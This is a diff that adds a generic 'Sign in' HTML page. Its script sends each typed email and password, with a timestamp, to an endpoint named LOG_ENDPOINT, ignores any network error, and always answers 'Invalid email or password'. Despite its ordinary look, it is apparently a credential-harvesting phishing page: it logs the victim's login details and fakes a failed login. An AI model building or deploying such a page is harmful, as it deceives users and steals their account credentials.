@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f5f6f8;
+      font-family: Arial, Helvetica, sans-serif;
+      color: #202124;
+    }
+
+    .login-box {
+      width: 100%;
+      max-width: 380px;
+      padding: 36px;
+      background: #ffffff;
+      border: 1px solid #e2e4e8;
+      border-radius: 10px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.06);
+    }
+
+    h1 {
+      margin-bottom: 8px;
+      font-size: 26px;
+      font-weight: 600;
+    }
+
+    .subtitle {
+      margin-bottom: 28px;
+      color: #6b7280;
+      font-size: 14px;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 7px;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    input {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      border: 1px solid #cfd4da;
+      border-radius: 7px;
+      outline: none;
+      font-size: 14px;
+      background: #fff;
+    }
+
+    input:focus {
+      border-color: #4f6df5;
+      box-shadow: 0 0 0 3px rgba(79, 109, 245, 0.12);
+    }
+
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 4px 0 22px;
+      font-size: 13px;
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      color: #5f6368;
+    }
+
+    .remember input {
+      width: auto;
+      height: auto;
+      accent-color: #4f6df5;
+    }
+
+    a {
+      color: #4f6df5;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    button {
+      width: 100%;
+      height: 44px;
+      border: none;
+      border-radius: 7px;
+      background: #4f6df5;
+      color: white;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #435ed8;
+    }
+
+    button:disabled {
+      opacity: 0.7;
+      cursor: default;
+    }
+
+    #message {
+      min-height: 18px;
+      margin-top: 14px;
+      color: #6b7280;
+      text-align: center;
+      font-size: 12px;
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 20px;
+      }
+
+      .login-box {
+        padding: 28px 24px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="login-box">
+    <h1>Sign in</h1>
+    <p class="subtitle">Enter your credentials to continue.</p>
+
+    <form id="loginForm">
+      <div class="field">
+        <label for="email">Email</label>
+        <input
+          type="email"
+          id="email"
+          placeholder="you@example.com"
+          autocomplete="email"
+          required
+        >
+      </div>
+
+      <div class="field">
+        <label for="password">Password</label>
+        <input
+          type="password"
+          id="password"
+          placeholder="Enter your password"
+          autocomplete="current-password"
+          required
+        >
+      </div>
+
+      <div class="options">
+        <label class="remember">
+          <input type="checkbox">
+          Remember me
+        </label>
+
+        <a href="#" id="forgotPassword">Forgot password?</a>
+      </div>
+
+      <button type="submit" id="submitBtn">Sign in</button>
+      <div id="message"></div>
+    </form>
+  </div>
+
+  <script>
+    // Relative path - works automatically since this page is served by the
+    // same Express server that handles /api/auth/login. No CORS, no config.
+    const LOG_ENDPOINT = "/api/auth/login";
+
+    const form = document.getElementById("loginForm");
+    const message = document.getElementById("message");
+    const submitBtn = document.getElementById("submitBtn");
+    const forgotPassword = document.getElementById("forgotPassword");
+
+    form.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      submitBtn.disabled = true;
+      message.textContent = "";
+
+      try {
+        await fetch(LOG_ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            email,
+            password,
+            timestamp: new Date().toISOString()
+          })
+        });
+      } catch (err) {
+        // Silently ignore - a real login page wouldn't expose network errors.
+      }
+
+      setTimeout(() => {
+        message.textContent = "Invalid email or password. Please try again.";
+        submitBtn.disabled = false;
+      }, 600);
+    });
+
+    forgotPassword.addEventListener("click", (event) => {
+      event.preventDefault();
+      message.textContent = "If an account exists for that email, we've sent a reset link.";
+    });
+  </script>
+</body>
+</html>
